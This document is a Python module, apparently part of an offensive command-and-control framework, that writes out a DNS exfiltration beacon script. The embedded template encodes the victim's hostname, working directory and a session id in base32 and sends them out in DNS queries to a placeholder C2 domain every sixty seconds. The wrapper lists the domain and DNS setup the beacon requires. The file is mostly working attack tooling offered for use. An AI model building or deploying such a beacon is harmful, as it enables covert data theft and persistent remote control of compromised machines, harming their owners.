"""beacon_dns — DNS beacon listener (parses DNS queries for exfil)"""
from pathlib import Path

TEMPLATE = '''
# omni_dns_beacon.py — DNS exfil beacon (agent side)
import socket, base64, time, os, uuid

C2_DOMAIN = "c2.your-domain.com"
SLEEP = 60

def dns_exfil(data):
    """send data via DNS query — 32 bytes per label max"""
    encoded = base64.b32encode(data.encode()).decode().rstrip("=")
    chunks = [encoded[i:i+32] for i in range(0, len(encoded), 32)]
    for i, chunk in enumerate(chunks):
        try:
            socket.gethostbyname(f"{i}.{chunk}.{C2_DOMAIN}")
        except Exception:
            pass

def main():
    session_id = uuid.uuid4().hex[:8]
    while True:
        info = f"{session_id}:{os.uname().nodename}:{os.getcwd()}"
        dns_exfil(info)
        time.sleep(SLEEP)

if __name__ == "__main__":
    main()
'''

class BeaconDns:
    def run(self, session, logger):
        out_dir = Path("payloads") / "c2"
        out_dir.mkdir(parents=True, exist_ok=True)
        script = out_dir / "omni_dns_beacon.py"
        script.write_text(TEMPLATE)
        print(f"[c2:beacon_dns] template written: {script}")
        print(f"  requires: registered domain + wildcard DNS record + authoritative NS")
        logger.info("c2_dns_beacon", path=str(script))
        return {"path": str(script)}
